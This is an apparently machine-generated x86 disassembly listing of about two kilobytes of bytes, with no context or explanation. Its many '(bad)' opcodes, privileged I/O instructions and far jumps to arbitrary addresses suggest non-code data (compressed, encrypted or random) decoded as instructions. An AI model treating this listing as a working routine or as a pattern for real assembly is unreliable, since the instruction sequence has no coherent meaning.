  4173fd:	push   edi
  4173fe:	(bad)  
  4173ff:	in     eax,0x80
  417401:	jbe    0x417423
  417403:	add    al,0x2c
  417405:	adc    edx,DWORD PTR [edx-0x71090a27]
  41740b:	out    dx,al
  41740c:	add    ebx,DWORD PTR [ebx]
  41740e:	inc    ebx
  41740f:	add    BYTE PTR [ecx+0x4144b8a9],dl
  417415:	stc    
  417416:	or     al,0x68
  417418:	mov    cl,0x48
  41741a:	or     eax,0xee1086f2
  41741f:	adc    bl,0xcf
  417422:	xor    esp,DWORD PTR [ecx+ebx*2]
  417425:	mov    cl,0xf9
  417427:	xchg   edx,eax
  417428:	mov    ds:0x138fe574,eax
  41742d:	int3   
  41742e:	and    bl,BYTE PTR [esp+esi*4+0x2d]
  417432:	xor    DWORD PTR [edx-0x17dcbced],eax
  417438:	sti    
  417439:	(bad)  
  41743a:	je     0x4173c5
  41743c:	mov    al,0x7b
  41743e:	lea    ebp,[ecx]
  417440:	mov    ebx,esi
  417442:	push   ds
  417443:	xor    eax,0xb40e03e7
  417448:	loope  0x4174bd
  41744a:	or     dl,BYTE PTR [eax]
  41744c:	push   eax
  41744d:	test   BYTE PTR [edi+0x7936b431],bh
  417453:	mov    ds,WORD PTR [ebp-0x59]
  417456:	les    ecx,FWORD PTR ds:0xc903382b
  41745c:	into   
  41745d:	mov    ch,0xc6
  41745f:	cmp    al,dl
  417461:	pop    edi
  417462:	inc    ebp
  417463:	xlat   BYTE PTR ds:[ebx]
  417464:	int    0x9b
  417466:	and    eax,DWORD PTR [esi]
  417468:	ja     0x417418
  41746a:	ds test al,0x62
  41746d:	aaa    
  41746e:	xchg   ebx,eax
  41746f:	inc    edi
  417470:	bound  ebx,QWORD PTR ds:0x331cc3c4
  417476:	stos   DWORD PTR es:[edi],eax
  417477:	scas   al,BYTE PTR es:[edi]
  417478:	fiadd  WORD PTR [ecx-0x1c21dfb9]
  41747e:	and    eax,0x4b4e1e58
  417483:	repnz sahf 
  417485:	inc    esi
  417486:	out    dx,eax
  417487:	xchg   ecx,eax
  417488:	xchg   DWORD PTR [ecx-0x58ff62f],esi
  41748e:	popf   
  41748f:	jmp    0x2ba3340c
  417494:	ret    0xe748
  417497:	and    edx,0x73
  41749a:	sub    al,0xd4
  41749c:	push   esp
  41749d:	or     al,0x7
  41749f:	push   cs
  4174a0:	iret   
  4174a1:	bound  esi,QWORD PTR [ebx+0x30bc09a2]
  4174a7:	cwde   
  4174a8:	inc    ebx
  4174a9:	daa    
  4174aa:	or     eax,0xa8cae774
  4174af:	sub    BYTE PTR [edx+ebx*8+0x49],dl
  4174b3:	push   ebx
  4174b4:	lahf   
  4174b5:	add    edi,DWORD PTR [eax+0x580d47b6]
  4174bb:	sub    al,0x1e
  4174bd:	nop
  4174be:	mov    cs,edx
  4174c0:	clc    
  4174c1:	adc    ebp,DWORD PTR [eax-0x58]
  4174c4:	xor    DWORD PTR [edx+0x32],esi
  4174c7:	daa    
  4174c8:	inc    ebp
  4174c9:	mov    bh,0x7c
  4174cb:	lea    ebp,[esi+0x74]
  4174ce:	pop    eax
  4174cf:	aad    0xe4
  4174d1:	rcr    DWORD PTR [edi],cl
  4174d3:	mov    ch,0x95
  4174d5:	pop    eax
  4174d6:	push   0xfffffffe
  4174d8:	aad    0x79
  4174da:	or     al,0x63
  4174dc:	(bad)  
  4174dd:	shr    BYTE PTR [edi],1
  4174df:	inc    ebp
  4174e0:	rol    BYTE PTR [ebx-0x340d81c6],cl
  4174e6:	and    esi,DWORD PTR [edx]
  4174e8:	clc    
  4174e9:	dec    ebx
  4174ea:	push   esi
  4174eb:	push   cs
  4174ec:	iret   
  4174ed:	sbb    DWORD PTR [ebp-0x2281dcc9],esi
  4174f3:	fild   QWORD PTR [esi]
  4174f5:	pushf  
  4174f6:	sub    al,0x6f
  4174f8:	add    eax,0x60a96c91
  4174fd:	call   0x466d5fb3
  417502:	test   DWORD PTR [esi*8+0x2ebd678f],esp
  417509:	ins    BYTE PTR es:[edi],dx
  41750a:	div    BYTE PTR [edi]
  41750c:	cmp    al,0x11
  41750e:	xor    BYTE PTR [eax+0x62],0xaf
  417512:	mov    ch,0x7b
  417514:	and    BYTE PTR [eax+esi*1+0x63358700],al
  41751b:	mov    ds:0x8461239c,eax
  417520:	int3   
  417521:	pusha  
  417522:	jg     0x417559
  417524:	dec    edi
  417525:	shr    BYTE PTR [esi+0x22],0xb3
  417529:	xchg   ecx,eax
  41752a:	jne    0x417571
  41752c:	(bad)  
  41752d:	sbb    eax,0x45521e0b
  417532:	mov    esp,0xf1d59a49
  417537:	mov    dh,0xf3
  417539:	or     al,0x78
  41753b:	mov    ebx,0x3266f527
  417540:	xor    ch,0x4b
  417543:	add    al,0xcb
  417545:	push   esi
  417546:	shr    DWORD PTR [ebp+0x67d7d0ce],1
  41754c:	cli    
  41754d:	gs adc eax,0x6dceca70
  417553:	loope  0x4174f0
  417555:	fadd   st,st(2)
  417557:	aad    0x41
  417559:	hlt    
  41755a:	inc    ebp
  41755b:	ss cmp al,0x9c
  41755e:	push   esi
  41755f:	jne    0x417535
  417561:	mov    DWORD PTR [esi-0x45],ecx
  417564:	or     al,0x58
  417566:	xchg   BYTE PTR [edi-0x331e61e1],al
  41756c:	xor    al,0x87
  41756e:	inc    esp
  41756f:	fistp  WORD PTR [ebp+0x12]
  417572:	or     al,ah
  417574:	aam    0x5e
  417576:	scas   al,BYTE PTR es:[edi]
  417577:	pop    esi
  417578:	fnstsw WORD PTR [edi-0xa]
  41757b:	mov    dl,0x2d
  41757d:	or     edx,DWORD PTR [edx]
  41757f:	aad    0x36
  417581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417582:	pop    edx
  417583:	in     al,0xf3
  417585:	sbb    edx,DWORD PTR [esi-0x7b8f4d8a]
  41758b:	inc    eax
  41758c:	sbb    al,0x2a
  41758e:	sub    eax,0x49ee6229
  417593:	and    eax,0xc4f32c2e
  417598:	sub    eax,0x5477f606
  41759d:	arpl   WORD PTR [ecx+0x7c45ced4],bx
  4175a3:	push   ecx
  4175a4:	inc    edx
  4175a5:	inc    eax
  4175a6:	cld    
  4175a7:	ret    
  4175a8:	dec    ebx
  4175a9:	fsub   st,st(5)
  4175ab:	loopne 0x417550
  4175ad:	mov    esi,0x4b5481ad
  4175b2:	mov    edi,0x27da28a1
  4175b7:	ror    cl,1
  4175b9:	or     cl,BYTE PTR [ebp-0x245c1bd6]
  4175bf:	fidivr WORD PTR [ecx]
  4175c1:	scas   al,BYTE PTR es:[edi]
  4175c2:	dec    edi
  4175c3:	or     al,0x85
  4175c5:	or     edx,DWORD PTR [esi-0x6380cffd]
  4175cb:	mov    ?,edx
  4175cd:	mov    ds:0x9b365f,al
  4175d2:	push   edi
  4175d3:	(bad)  
  4175d4:	call   0xd210:0x6695427e
  4175db:	sub    eax,0xa9889343
  4175e0:	sbb    cl,BYTE PTR [eax-0x582eba6c]
  4175e6:	mov    al,ds:0xac0ef7e8
  4175eb:	in     eax,dx
  4175ec:	xor    DWORD PTR ds:0xbef9c10f,eax
  4175f2:	jb     0x417603
  4175f4:	xchg   DWORD PTR [edx+0x79c67ff3],esi
  4175fa:	push   ss
  4175fb:	cmp    al,0x49
  4175fd:	dec    eax
  4175fe:	mov    eax,0x7fe6e496
  417603:	xor    ebp,eax
  417605:	imul   ecx,DWORD PTR [ecx+0x35e676f7],0xf9449bb4
  41760f:	cmp    DWORD PTR [edx],0xc4d9010a
  417615:	cdq    
  417616:	sub    DWORD PTR [eax],edi
  417618:	push   eax
  417619:	inc    ebx
  41761a:	imul   esp,DWORD PTR [esi],0xffffffa5
  41761d:	retf   
  41761e:	add    dh,dh
  417620:	sub    eax,0xbf02acb7
  417625:	jle    0x4175f8
  417627:	enter  0x4981,0x7b
  41762b:	pop    ecx
  41762c:	push   edx
  41762d:	xchg   edx,eax
  41762e:	xchg   ecx,eax
  41762f:	add    ebp,edi
  417631:	push   es
  417632:	jmp    0x417692
  417634:	or     cl,dl
  417636:	push   ebp
  417637:	js     0x417689
  417639:	push   ds
  41763a:	dec    edi
  41763b:	sar    BYTE PTR [esi-0x5da5a07a],1
  417641:	rcl    BYTE PTR [ebp-0x7c],cl
  417644:	inc    ebp
  417646:	out    0xca,al
  417648:	push   eax
  417649:	adc    eax,0xebddba0
  41764e:	pop    ebp
  41764f:	(bad)  
  417650:	nop
  417651:	push   edx
  417652:	xchg   edi,eax
  417653:	ss out 0xb9,eax
  417656:	fnstenv [eax+ebp*2]
  417659:	jmp    0x4176b9
  41765b:	adc    ecx,DWORD PTR [ebx-0x7c]
  41765e:	and    bh,BYTE PTR [ecx+ebx*4-0x48]
  417662:	lahf   
  417663:	xor    BYTE PTR [ebx],cl
  417665:	hlt    
  417666:	jns    0x417686
  417668:	ja     0x4175ea
  41766a:	mov    eax,ds:0x57cc7e16
  41766f:	jmp    0xf4fe:0xaa022c8
  417676:	cmp    al,0x70
  417678:	popf   
  417679:	jnp    0x4176e0
  41767b:	xor    eax,0x7eedacf0
  417680:	cld    
  417681:	xchg   ecx,eax
  417682:	fcomp  DWORD PTR ds:0xe941a6f4
  417688:	xchg   esp,eax
  417689:	mov    DWORD PTR [esi],edi
  41768b:	loopne 0x4176a9
  41768d:	mov    eax,ds:0xd523b195
  417692:	leave  
  417693:	hlt    
  417694:	mov    ds:0x707a965d,al
  417699:	retf   
  41769a:	adc    DWORD PTR [edi+0x24],eax
  41769d:	and    al,0x93
  41769f:	adc    bh,bl
  4176a1:	scas   eax,DWORD PTR es:[edi]
  4176a2:	call   0xa148:0xda41bc9b
  4176a9:	adc    BYTE PTR [eax+0x2e],al
  4176ac:	mov    ebp,0x63debf43
  4176b1:	sbb    DWORD PTR [ebp-0x45],edi
  4176b4:	(bad)  
  4176b5:	jnp    0x417642
  4176b7:	add    al,0x91
  4176b9:	mov    DWORD PTR [ecx],esp
  4176bb:	(bad)  
  4176bc:	(bad)  
  4176bd:	cli    
  4176be:	popa   
  4176bf:	dec    esi
  4176c0:	xchg   esp,ebx
  4176c2:	pop    esi
  4176c3:	aam    0x1c
  4176c5:	aaa    
  4176c6:	xchg   edx,eax
  4176c7:	data16 (bad) 
  4176c9:	sub    eax,0x8de8ca74
  4176ce:	push   esp
  4176cf:	mov    bh,0xff
  4176d1:	cmp    ch,ah
  4176d3:	pop    edx
  4176d4:	es mov bh,0x2
  4176d7:	jb     0x417672
  4176d9:	inc    ebx
  4176da:	pop    ss
  4176db:	lock xlat BYTE PTR ds:[ebx]
  4176dd:	mov    al,ds:0xc306ccca
  4176e2:	or     cl,BYTE PTR [eax+0xdd49876]
  4176e8:	xchg   bh,ch
  4176ea:	pop    edi
  4176eb:	scas   al,BYTE PTR es:[edi]
  4176ec:	pop    esi
  4176ed:	jecxz  0x417684
  4176ef:	sub    eax,edi
  4176f1:	jmp    0x417730
  4176f3:	cmp    al,0xe6
  4176f5:	push   esp
  4176f6:	fbld   TBYTE PTR [ebx]
  4176f8:	pushf  
  4176f9:	test   BYTE PTR [ebx],bl
  4176fb:	mov    ecx,0x670a0a08
  417700:	mov    bl,0x6a
  417702:	xor    eax,0x3556b9f8
  417707:	mov    BYTE PTR [esi-0x4c],cl
  41770a:	jnp    0x417700
  41770c:	sbb    bl,bh
  41770e:	sbb    ah,ch
  417710:	pop    edi
  417711:	cli    
  417712:	or     esp,edx
  417714:	mov    ds:0xa08bf3b5,eax
  417719:	push   esp
  41771a:	enter  0xaba4,0xb6
  41771e:	and    DWORD PTR [esi+eax*4-0x6713c1c2],eax
  417725:	cld    
  417726:	cdq    
  417727:	mov    bh,0x72
  417729:	and    dh,bh
  41772b:	lds    esi,FWORD PTR [esi]
  41772d:	sbb    al,0xe4
  41772f:	lods   eax,DWORD PTR ds:[esi]
  417730:	out    0x37,al
  417732:	mov    al,ds:0x45b492f2
  417737:	je     0x4176ed
  417739:	arpl   WORD PTR [eax],sp
  41773b:	inc    esp
  41773c:	jmp    0x2fd2:0x5af5cc7c
  417743:	into   
  417744:	stc    
  417745:	add    DWORD PTR [eax+0x681bf41],esp
  41774b:	sub    esp,DWORD PTR [esi+0x6b]
  41774e:	xor    BYTE PTR [edi-0x68],bh
  417751:	les    ebx,FWORD PTR [esp+eiz*8]
  417754:	adc    DWORD PTR ds:0x1961038f,esi
  41775a:	pop    ss
  41775b:	and    al,0xf2
  41775d:	jmp    0x417710
  41775f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417760:	ss inc ecx
  417762:	scas   al,BYTE PTR es:[edi]
  417763:	(bad)  
  417764:	out    dx,eax
  417765:	pushf  
  417766:	ret    0xec15
  417769:	mov    ch,0x2f
  41776b:	pop    esp
  41776c:	mov    ebx,0x480b8dc9
  417771:	cmp    eax,esi
  417773:	loope  0x417713
  417775:	fdivr  DWORD PTR [ebx]
  417777:	(bad)  
  417778:	jge    0x417714
  41777a:	mov    WORD PTR [ebp-0x5f],cs
  41777d:	mov    edi,0x4cdcd16f
  417782:	arpl   di,ax
  417784:	iret   
  417785:	add    BYTE PTR [esi],bh
  417787:	jbe    0x417783
  417789:	stos   BYTE PTR es:[edi],al
  41778a:	and    al,al
  41778c:	pushf  
  41778d:	sti    
  41778e:	ret    
  41778f:	imul   esi,DWORD PTR [esi-0x76],0x1eb59918
  417796:	cmp    BYTE PTR [edx+esi*8+0x4146208a],bl
  41779d:	push   edx
  41779e:	lahf   
  41779f:	xlat   BYTE PTR ds:[ebx]
  4177a0:	cwde   
  4177a1:	(bad)  
  4177a3:	jg     0x417757
  4177a5:	sbb    dh,BYTE PTR [ebx+0x26cd16b4]
  4177ab:	neg    DWORD PTR [eax-0x2f]
  4177ae:	dec    eax
  4177af:	call   FWORD PTR [ecx+0x9e05296]
  4177b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177b6:	fmul   st(0),st
  4177b8:	sahf   
  4177b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177ba:	mov    bh,0xaa
  4177bc:	xchg   edx,eax
  4177bd:	inc    edi
  4177be:	xchg   DWORD PTR [ebx],edx
  4177c0:	lea    esp,[edi]
  4177c2:	rcl    DWORD PTR [edi-0x6f],cl
  4177c5:	or     al,0xcc
  4177c7:	mov    ebx,0xee90443f
  4177cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177cd:	mov    edi,0x7bc4a870
  4177d2:	mov    cl,BYTE PTR [esi+0x4d15b888]
  4177d8:	(bad)
  4177dc:	xchg   ebx,eax
  4177dd:	call   0x64bc:0x11118aff
  4177e4:	hlt    
  4177e5:	adc    ecx,DWORD PTR [ecx+ebp*1-0x36]
  4177e9:	pop    ecx
  4177ea:	mov    dl,0x3c
  4177ec:	nop
  4177ed:	jmp    0xd8b4:0x83190db1
  4177f4:	fisttp QWORD PTR [eax-0x2d1c8082]
  4177fa:	inc    ecx
  4177fb:	jge    0x417853
  4177fd:	cmc    
  4177fe:	loopne 0x417797
  417800:	xchg   ebp,eax
  417801:	(bad)  
  417802:	jmp    0x4177ef
  417804:	and    DWORD PTR [ebx-0x6c],ebx
  417807:	dec    edx
  417808:	xor    dh,BYTE PTR [esi+ebp*2]
  41780b:	xchg   esp,eax
  41780c:	inc    edx
  41780d:	push   esp
  41780e:	xchg   BYTE PTR [eax-0x60],bh
  417811:	pop    edx
  417812:	and    edx,DWORD PTR [edx-0xb9115f]
  417818:	sub    eax,0xd92cb09f
  41781d:	call   0xb3bc:0x662ba021
  417824:	cs loopne 0x4177b0
  417827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417829:	mov    al,ds:0x1ed0ef25
  41782e:	ret    
  41782f:	scas   eax,DWORD PTR es:[edi]
  417830:	push   esi
  417831:	test   BYTE PTR [eax+ebp*2+0x4b57923c],cl
  417838:	test   DWORD PTR [ebp-0xe969eef],0xda7dfdbe
  417842:	xchg   ebx,eax
  417843:	repnz mov fs,WORD PTR [edx+0x4422e618]
  41784a:	int3   
  41784b:	mov    esi,tr0
  41784e:	mov    ch,0xa9
  417850:	jle    0x417863
  417852:	xchg   ebx,eax
  417853:	xchg   ebp,esp
  417855:	mov    edx,0xec4b5a59
  41785a:	hlt    
  41785b:	jae    0x4177dd
  41785d:	add    al,0xc2
  41785f:	fidiv  DWORD PTR [ebp-0x434fbdef]
  417865:	dec    ecx
  417866:	cmc    
  417867:	adc    dh,BYTE PTR [ebp-0x531a10be]
  41786d:	dec    eax
  41786e:	fwait
  41786f:	(bad)  
  417871:	sbb    DWORD PTR [edi],ebx
  417873:	cmp    DWORD PTR [edx],ebp
  417875:	and    bh,ah
  417877:	(bad)  [ebx]
  417879:	and    DWORD PTR [edx+0x64],0x975bfa35
  417880:	dec    DWORD PTR [eax-0x69]
  417883:	push   edi
  417884:	ret    0xdd45
  417887:	xlat   BYTE PTR ds:[ebx]
  417888:	and    dh,bh
  41788a:	inc    esp
  41788b:	es add eax,0xab299a60
  417891:	gs and ebx,eax
  417894:	fild   QWORD PTR [ecx]
  417896:	cmp    esi,DWORD PTR [edx+0x24]
  417899:	imul   ebp,ebx,0x58d6e3cd
  41789f:	mov    edi,0x52bd0986
  4178a4:	xor    DWORD PTR [ebp+0x10],ebx
  4178a7:	aad    0xf0
  4178a9:	data16 fwait
  4178ab:	xadd   ecx,edi
  4178ae:	jnp    0x4178e6
  4178b0:	call   0xe1b5fb33
  4178b5:	test   BYTE PTR ds:0x7f351391,ch
  4178bb:	and    ch,bh
  4178bd:	add    esp,0x50
  4178c0:	ds push ebp
  4178c2:	stc    
  4178c3:	xlat   BYTE PTR ds:[ebx]
  4178c4:	cld    
  4178c5:	pop    es
  4178c6:	or     al,0xce
  4178c8:	xchg   DWORD PTR [edx+0x5a],ebp
  4178cb:	xor    DWORD PTR [esi],eax
  4178cd:	xor    eax,0x3a86d142
  4178d2:	pop    ebx
  4178d3:	cli    
  4178d4:	xor    edx,DWORD PTR [edi+0x68]
  4178d7:	rcl    DWORD PTR [esi-0x49e7034a],cl
  4178dd:	(bad)  
  4178de:	aam    0xd6
  4178e0:	push   0x2b
  4178e2:	or     ebx,esi
  4178e4:	jno    0x4178ba
  4178e6:	loope  0x417961
  4178e8:	fcomp  QWORD PTR [esp+ebx*4+0xe]
  4178ec:	in     eax,dx
  4178ed:	cli    
  4178ee:	ins    DWORD PTR es:[edi],dx
  4178ef:	sub    eax,0x656759cf
  4178f4:	cmp    eax,0x4b408083
  4178f9:	adc    al,0x1
  4178fb:	aad    0x45
  4178fd:	es dec esp
  4178ff:	enter  0x9ae7,0x6f
  417903:	pop    esi
  417904:	adc    DWORD PTR [esi-0x1fef66ef],0x2b601ef8
  41790e:	scas   al,BYTE PTR es:[edi]
  41790f:	and    al,0x25
  417911:	cmp    esp,ebx
  417913:	fiadd  DWORD PTR [esi]
  417915:	and    eax,0x95c215e0
  41791a:	jnp    0x4178cf
  41791c:	ins    BYTE PTR es:[edi],dx
  41791d:	mov    bh,0xa8
  41791f:	mov    ebp,0x9c84aa1f
  417924:	xor    esp,ecx
  417926:	pusha  
  417927:	mov    ah,0x96
  417929:	xor    eax,0x77dec8f5
  41792e:	add    eax,0xdddf8fe0
  417933:	cmp    bh,cl
  417935:	adc    BYTE PTR [ebx],al
  417937:	pop    ss
  417938:	pop    edi
  417939:	test   eax,0xdb30f9ee
  41793e:	mov    ds:0x22cfaa06,eax
  417943:	ss inc esp
  417945:	test   al,0xc8
  417947:	popf   
  417948:	jle    0x417996
  41794a:	fld    TBYTE PTR [ecx]
  41794c:	das    
  41794d:	lods   al,BYTE PTR ds:[esi]
  41794e:	(bad)  
  41794f:	mov    esi,0xb51de1da
  417954:	sub    ecx,DWORD PTR [edx]
  417956:	inc    edi
  417957:	mov    esp,0xf56c99f8
  41795c:	mov    al,ds:0x9f1ea346
  417961:	movzx  esp,WORD PTR [ebp-0x35]
  417965:	data16 fisttp QWORD PTR [esi+0x5c2a320b]
  41796c:	rcl    DWORD PTR [esi+0x37e1db0b],cl
  417972:	sub    edi,0xeee5e3c0
  417978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417979:	and    BYTE PTR [ecx-0x403f8858],bl
  41797f:	inc    eax
  417980:	jns    0x4179c6
  417982:	int    0xdd
  417984:	sub    bh,BYTE PTR [ecx-0x41]
  417987:	lods   eax,DWORD PTR ds:[si]
  417989:	jb     0x417938
  41798b:	rcr    eax,0xbe
  41798e:	les    ecx,FWORD PTR [esi-0x62c3cfad]
  417994:	adc    eax,0x20443db4
  417999:	sub    dh,BYTE PTR [eax+0x130a33c9]
  41799f:	std    
  4179a0:	mov    edx,0x849974d8
  4179a5:	test   dl,bh
  4179a7:	add    eax,0xd74ab121
  4179ac:	in     al,0xe2
  4179ae:	loopne 0x41794d
  4179b0:	add    DWORD PTR [eax+0x2e],ebx
  4179b3:	in     al,0xb7
  4179b5:	or     DWORD PTR ds:0xbbeb194c,ecx
  4179bb:	test   al,0xaf
  4179bd:	xchg   edi,eax
  4179be:	push   0xffffffc8
  4179c0:	or     eax,0xd4caf823
  4179c5:	ret    0x1b17
  4179c8:	mov    edi,0xd6aab3a9
  4179cd:	aam    0x3a
  4179cf:	enter  0x5f36,0x9a
  4179d3:	fcmovnbe st,st(3)
  4179d5:	mov    bh,dl
  4179d7:	fisubr DWORD PTR fs:[edx+0x65cd7cd2]
  4179de:	xor    ecx,eax
  4179e0:	xor    al,0x0
  4179e2:	sbb    al,ch
  4179e4:	mov    ecx,0x96efce17
  4179e9:	mov    edx,0x8daef8f4
  4179ee:	adc    al,0xd9
  4179f0:	adc    edx,DWORD PTR [bx+di+0x2]
  4179f4:	jg     0x417a62
  4179f6:	ja     0x4179fd
  4179f8:	fadd   st,st(3)
  4179fa:	in     eax,0xb8
  4179fc:	retf   
  4179fd:	out    dx,eax
  4179fe:	adc    al,0x93
  417a00:	jge    0x417982
  417a02:	adc    DWORD PTR [edi],ebx
  417a04:	(bad)  
  417a05:	pop    esi
  417a06:	rcl    BYTE PTR [esi-0x7f],0xa9
  417a0a:	sbb    BYTE PTR [edi+0x1a],al
  417a0d:	out    dx,eax
  417a0e:	hlt    
  417a0f:	mov    es,WORD PTR [eax+0x2e5f0a25]
  417a15:	mov    eax,0x1c9a0f79
  417a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a1b:	out    dx,al
  417a1c:	cdq    
  417a1d:	inc    edx
  417a1e:	fimul  DWORD PTR [ebx+0x55]
  417a21:	call   0xee18d2c
  417a26:	push   edi
  417a27:	cwde   
  417a28:	jmp    0x26f4d900
  417a2d:	jae    0x417a2c
  417a2f:	dec    ebx
  417a30:	sub    ebp,DWORD PTR ds:0xf421bad0
  417a36:	cmp    al,BYTE PTR [ecx+0x32]
  417a39:	lahf   
  417a3a:	loop   0x4179eb
  417a3c:	mov    ch,0xc0
  417a3e:	push   edi
  417a3f:	repnz pop ebp
  417a41:	shl    DWORD PTR [edi],cl
  417a43:	into   
  417a44:	ss pop edx
  417a46:	aas    
  417a47:	jae    0x417ac2
  417a49:	adc    cl,ah
  417a4b:	fadd   DWORD PTR [edx+eiz*1+0x4b]
  417a4f:	mov    cl,0x2c
  417a51:	pushf  
  417a52:	jg     0x417ac8
  417a54:	jecxz  0x417a26
  417a56:	sbb    dh,BYTE PTR ds:0xda1b038f
  417a5c:	clc    
  417a5d:	xchg   esp,eax
  417a5e:	ja     0x417aa5
  417a60:	mov    edi,ebx
  417a62:	xchg   esp,eax
  417a63:	mov    eax,0x77dbe849
  417a68:	popa   
  417a69:	(bad)  
  417a6a:	mov    al,0x24
  417a6c:	mov    bl,0xe3
  417a6e:	pusha  
  417a6f:	pop    esp
  417a70:	and    al,0x96
  417a72:	aas    
  417a73:	cmp    bh,BYTE PTR fs:[ebx+0x42]
  417a77:	imul   ecx,DWORD PTR [ebx-0x2c],0x72
  417a7b:	pop    eax
  417a7c:	scas   al,BYTE PTR es:[edi]
  417a7d:	ds mov bh,0xfe
  417a80:	addr16 push edi
  417a82:	(bad)  
  417a83:	push   ebp
  417a84:	add    eax,0x2770e73c
  417a89:	jne    0x417a99
  417a8b:	(bad)  
  417a8c:	jmp    ebx
  417a8e:	or     DWORD PTR [ebp+0x6a],eax
  417a91:	aam    0x8f
  417a93:	pop    esi
  417a94:	cmp    eax,0x2fc2bded
  417a99:	lods   al,BYTE PTR ds:[esi]
  417a9a:	cld    
  417a9b:	test   DWORD PTR [edi+0x1d5dfcef],esi
  417aa1:	cwde   
  417aa2:	fwait
  417aa3:	aaa    
  417aa4:	adc    dh,ah
  417aa6:	xlat   BYTE PTR ds:[ebx]
  417aa7:	xchg   edx,eax
  417aa8:	pmuludq mm6,QWORD PTR [ebp-0x3c]
  417aac:	fchs   
  417aae:	outs   dx,DWORD PTR ds:[esi]
  417aaf:	enter  0x714a,0xac
  417ab3:	jp     0x417ae2
  417ab5:	xsaveopt [ebx]
  417ab8:	pop    ds
  417ab9:	jecxz  0x417aed
  417abb:	icebp  
  417abc:	shl    bh,cl
  417abe:	mov    bl,BYTE PTR [edi+0x33]
  417ac1:	mov    ch,0x63
  417ac3:	retf   
  417ac4:	imul   edi,DWORD PTR [eax],0xec46ce67
  417aca:	inc    ecx
  417acb:	add    BYTE PTR ds:0x6707857c,al
  417ad1:	xchg   esi,eax
  417ad2:	push   esp
  417ad3:	mul    DWORD PTR [ebp+0x20]
  417ad6:	pop    ss
  417ad7:	push   ecx
  417ad8:	or     ecx,esi
  417ada:	pop    DWORD PTR [edi-0x12]
  417add:	and    eax,0x4d50434b
  417ae2:	arpl   WORD PTR [ebx+0x72356604],bx
  417ae8:	je     0x417b06
  417aea:	fsub   QWORD PTR [eax-0x9c2906a]
  417af0:	pop    eax
  417af1:	pop    esi
  417af2:	in     eax,0xc0
  417af4:	inc    ebp
  417af5:	ss mov edi,0xd3ee0b90
  417afb:	(bad)  
  417afc:	ins    DWORD PTR es:[edi],dx
  417afd:	ret    
  417afe:	xlat   BYTE PTR ds:[ebx]
  417aff:	call   0xd4a36a6c
  417b04:	imul   BYTE PTR [ebp+edi*2+0x540b5f65]
  417b0b:	add    DWORD PTR [edi+eax*2+0x30],ebp
  417b0f:	mov    al,0x3d
  417b11:	test   dl,al
  417b13:	lahf   
  417b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b15:	or     bl,ah
  417b17:	hlt    
  417b18:	inc    ebx
  417b19:	jae    0x417b5b
  417b1b:	adc    ebp,DWORD PTR [ebx-0x69]
  417b1e:	push   0xb062360d
  417b23:	pop    eax
  417b24:	pop    ds
  417b25:	mov    bh,0x80
  417b27:	bound  ax,DWORD PTR [eax+0x2136c57]
  417b2e:	into   
  417b2f:	loopne 0x417b8b
  417b31:	popf   
  417b32:	in     eax,dx
  417b33:	enter  0xf9c1,0x8d
  417b37:	loop   0x417b1f
  417b39:	mov    bh,0xbc
  417b3b:	lock xchg esi,eax
  417b3d:	(bad)  
  417b3f:	ret    
  417b40:	ins    DWORD PTR es:[edi],dx
  417b41:	mov    dh,BYTE PTR [ebx*2-0x6d48e011]
  417b48:	and    esp,ebp
  417b4a:	clc    
  417b4b:	in     eax,0x3d
  417b4d:	pop    es
  417b4e:	aad    0x1f
  417b50:	pop    ebp
  417b51:	mov    dl,BYTE PTR [esi+ebp*4-0x4a]
  417b55:	and    al,ch
  417b57:	jmp    0x9e5e:0x62eccf1a
  417b5e:	lods   al,BYTE PTR ds:[esi]
  417b5f:	pop    edi
  417b60:	xchg   ebx,eax
  417b61:	inc    esi
  417b62:	mov    dl,BYTE PTR [ecx+0x4afa9431]
  417b68:	jge    0x417bac
  417b6a:	popa   
  417b6b:	cmp    al,0xbf
  417b6d:	mov    ds:0xb89cc3b7,al
  417b72:	cmp    eax,0xf30c8bd8
  417b77:	push   ebp
  417b78:	pop    ss
  417b79:	jae    0x417b34
  417b7b:	xor    BYTE PTR [ebp-0x48],0x9c
  417b7f:	es jp  0x417b10
  417b82:	xchg   edi,eax
  417b83:	ror    BYTE PTR [edx+0x17],0x24
  417b87:	push   0x17
  417b89:	inc    esi
  417b8a:	fist   DWORD PTR [ecx]
  417b8c:	push   ss
  417b8d:	outs   dx,BYTE PTR ds:[esi]
  417b8e:	fcmovnu st,st(7)
  417b90:	into   
  417b91:	xchg   BYTE PTR [edx],dl
  417b93:	fld    DWORD PTR [eax+0x63]
  417b96:	lods   al,BYTE PTR ds:[esi]
  417b97:	sub    BYTE PTR [ebx-0xb],ch
  417b9a:	and    BYTE PTR [ecx-0x5f1198d0],bh
  417ba0:	xchg   esi,eax
  417ba1:	ror    BYTE PTR ds:[ebp+esi*1+0x2eecd350],cl
  417ba9:	xor    edi,DWORD PTR [ecx-0x143bae69]
  417baf:	xchg   edi,eax
  417bb0:	mov    WORD PTR [esp+ebp*8+0x60],es
  417bb4:	je     0x417be3
  417bb6:	in     eax,0x8
  417bb8:	adc    ecx,DWORD PTR [esi+0x34]
  417bbb:	inc    ecx
  417bbc:	(bad)  
  417bbd:	mov    ecx,0x869720b4
  417bc2:	mov    al,ds:0x3329134f
  417bc7:	popa   
  417bc8:	mov    al,0x68
  417bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bcb:	mov    dh,0x22
  417bcd:	add    DWORD PTR [eax+esi*8+0x23],ebp
  417bd1:	sti    
  417bd2:	loopne 0x417c24
  417bd4:	mov    eax,ds:0x69e4fae0
  417bd9:	cli    
  417bda:	push   esi
  417bdb:	push   esp
  417bdc:	cmp    eax,0x4eb2d28
  417be1:	iret   
  417be2:	push   0xee5a86ad
  417be7:	and    eax,DWORD PTR [ecx]
  417be9:	jmp    0x417b9f
  417beb:	hlt    
